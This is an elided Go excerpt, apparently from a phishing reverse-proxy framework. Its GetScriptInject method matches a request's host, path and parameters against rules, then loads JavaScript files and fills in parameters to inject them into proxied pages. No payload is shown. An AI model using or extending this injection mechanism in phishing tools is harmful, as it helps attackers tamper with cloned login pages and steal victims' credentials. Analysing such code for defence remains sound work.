...
func (p *Phishlet) GetScriptInject(hostname string, path string, params *map[string]string) (string, error) {
	...
	for _, js := range p.js_inject {
		...
		for _, h := range js.trigger_domains {
			if h == strings.ToLower(hostname) || h == "*" {
				host_matched = true
				//break
			}
			...
			if host_matched {
				...
				if path_matched {
					...
					if params_matched {
						...
						if params != nil {
							for k, v := range *params {
								...
								if _, err := os.Stat(script); err == nil { //if the script is a file read it

									b, _ := ioutil.ReadFile(script) // just pass the file name

									script = string(b) // convert content to a 'string'

									script = strings.Replace(script, "{"+k+"}", v, -1)
									JavascriptConcation += strings.Repeat("\r\n", 5)
									JavascriptConcation += script
					...
					return JavascriptConcation, nil
				}
